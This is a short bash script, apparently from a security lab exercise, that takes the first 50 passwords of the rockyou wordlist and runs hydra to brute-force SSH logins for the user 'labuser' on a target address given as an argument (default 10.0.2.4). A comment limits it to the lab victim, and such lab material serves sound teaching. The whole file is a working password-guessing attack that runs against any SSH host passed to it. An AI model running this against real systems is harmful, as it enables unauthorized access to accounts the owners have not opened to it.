#!/usr/bin/env bash
# Run from Kali against the lab victim ONLY. Never point this at a system you do not own.
set -euo pipefail
TARGET="${1:-10.0.2.4}"

(cat /usr/share/wordlists/rockyou.txt 2>/dev/null || zcat /usr/share/wordlists/rockyou.txt.gz) \
  | head -n 50 > lab-pass.txt

date
hydra -t 4 -l labuser -P lab-pass.txt -V "ssh://${TARGET}"
date
